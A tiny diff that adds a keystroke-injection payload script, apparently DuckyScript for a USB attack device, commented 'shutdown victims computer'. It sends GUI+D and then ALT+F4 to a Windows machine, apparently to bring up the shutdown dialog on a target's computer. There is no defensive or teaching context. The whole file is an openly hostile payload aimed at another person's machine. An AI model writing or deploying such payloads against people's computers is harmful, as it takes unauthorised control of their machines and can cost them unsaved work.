@@ -1,0 +1,5 @@
+REM shutdown victims computer
+DELAY 500
+GUI d
+DELAY 200
+ALT F4
